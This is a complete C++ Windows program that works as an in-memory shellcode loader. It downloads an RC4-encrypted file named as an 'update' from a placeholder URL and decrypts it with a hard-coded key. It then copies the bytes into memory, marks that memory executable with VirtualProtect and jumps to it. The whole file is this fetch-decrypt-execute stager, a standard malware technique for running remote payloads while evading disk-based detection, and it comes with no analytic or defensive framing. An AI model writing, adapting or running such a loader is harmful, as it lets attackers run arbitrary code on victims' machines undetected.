#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <memory>
#include <string>
#include <ctime>
#include <sstream>
#include <random>

#pragma comment(lib, "wininet.lib")

class RC4 {
public:
    RC4(const std::vector<unsigned char>& key) {
        for (int i = 0; i < 256; ++i) {
            S[i] = i;
        }

        int j = 0;
        for (int i = 0; i < 256; ++i) {
            j = (j + S[i] + key[i % key.size()]) % 256;
            std::swap(S[i], S[j]);
        }
    }

    void encrypt(std::vector<unsigned char>& data) {
        int i = 0, j = 0;
        for (size_t k = 0; k < data.size(); ++k) {
            i = (i + 1) % 256;
            j = (j + S[i]) % 256;
            std::swap(S[i], S[j]);
            data[k] ^= S[(S[i] + S[j]) % 256];
        }
    }

private:
    int S[256];
};

std::vector<unsigned char> downloadFile(const std::wstring& url) {
    HINTERNET hInternet = InternetOpen(L"MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return {};

    HINTERNET hFile = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return {};
    }

    std::vector<unsigned char> data;
    const DWORD BUFFER_SIZE = 4096;
    unsigned char buffer[BUFFER_SIZE];
    DWORD bytesRead;

    while (InternetReadFile(hFile, buffer, BUFFER_SIZE, &bytesRead) && bytesRead != 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return data;
}

void executeInMemory(const std::vector<unsigned char>& data) {
    // Step 1: Allocate memory as writable
    void* execData = VirtualAlloc(NULL, data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execData) return;

    // Step 2: Use RtlMoveMemory to move the decrypted data into allocated space
    RtlMoveMemory(execData, data.data(), data.size());

    // Step 3: Change memory permissions to executable
    DWORD oldProtect;
    if (!VirtualProtect(execData, data.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(execData, 0, MEM_RELEASE);
        return;
    }

    // Step 4: Execute the binary data
    auto func = reinterpret_cast<void(*)()>(execData);
    func();

    // Clean up: Reset permissions and free memory
    VirtualProtect(execData, data.size(), oldProtect, &oldProtect);
    VirtualFree(execData, 0, MEM_RELEASE);
}

int main() {
    std::wstring url = L"https://url.to/the/encrypted_update.bin";
    std::vector<unsigned char> encryptedData = downloadFile(url);
    std::string key = "c60b710754e906a1609330e70760c2db"; // Replace with your actual key
    std::vector<unsigned char> keyBytes(key.begin(), key.end());
    RC4 rc4(keyBytes);
    rc4.encrypt(encryptedData); // Decrypting since RC4 is symmetric

    executeInMemory(encryptedData);
    return 0;
}
